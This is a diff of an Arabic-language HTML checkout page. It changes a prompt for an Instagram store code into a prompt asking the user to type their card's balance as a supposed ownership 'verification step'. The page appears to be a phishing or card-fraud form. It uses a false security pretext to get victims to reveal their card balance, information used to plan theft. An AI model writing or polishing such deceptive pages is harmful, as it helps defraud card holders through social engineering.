@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>إدخال كود المتجر</title>
+  <title>إدخال مبلغ الحساب </title>
 
   <style>
     :root {
@@ -110,12 +110,12 @@
 <body>
   <div class="page-wrapper">
     <div class="card">
-      <h1>خطوة واحدة إضافية</h1>
+      <h1>خطوة تحقق واحدة إضافية</h1>
       <p class="subtitle">
-        قم بإدخال الكود الذي وصلك من المتجر في إنستغرام لإتمام طلبك.
+        قم بكتابة قيمة الرصيد في البطاقة المدخلة لتحقق من ملكيتك لإتمام طلبك.
       </p>
 
-      <label for="code-input">كود المتجر</label>
+      <label for="code-input">رصيد البطاقة</label>
       <input
         id="code-input"
         class="code-input"
@@ -123,7 +123,7 @@
         inputmode="numeric"
         pattern="[0-9]*"
         maxlength="12"
-        placeholder="أدخل الكود هنا"
+        placeholder="أدخل الرصيد هنا"
       />
 
       <div class="error" id="error-msg"></div>
@@ -149,7 +149,7 @@
       const code = codeInput.value.trim();
 
       if (!code) {
-        errorMsg.textContent = "الرجاء إدخال الكود قبل المتابعة.";
+        errorMsg.textContent = "الرجاء إدخال رصيد البطاقة للتحقق قبل المتابعة.";
         return;
       }
 
